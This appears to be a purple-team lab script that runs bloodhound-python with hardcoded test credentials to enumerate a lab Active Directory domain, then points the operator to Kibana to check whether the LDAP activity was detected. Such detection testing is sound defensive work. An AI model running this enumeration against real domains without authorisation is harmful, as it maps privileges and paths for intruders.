#!/bin/bash
# Attack Simulation: BloodHound AD Enumeration
# MITRE ATT&CK: T1069.002
# Usage: ./bloodhound_collect.sh
# Requirements: bloodhound-python installed on Kali

DC_IP="192.168.50.86"
DOMAIN="lab.local"
USERNAME="jsmith"
PASSWORD="Password123!"

echo "[*] Running BloodHound collector against $DOMAIN"
bloodhound-python \
    -u ${USERNAME}@${DOMAIN} \
    -p "${PASSWORD}" \
    -d $DOMAIN \
    -ns $DC_IP \
    -dc dc01.lab.local \
    --auth-method ntlm \
    -c all \
    --dns-timeout 10 \
    --dns-tcp

echo "[*] Collection complete - check Kibana for LDAP connection events"
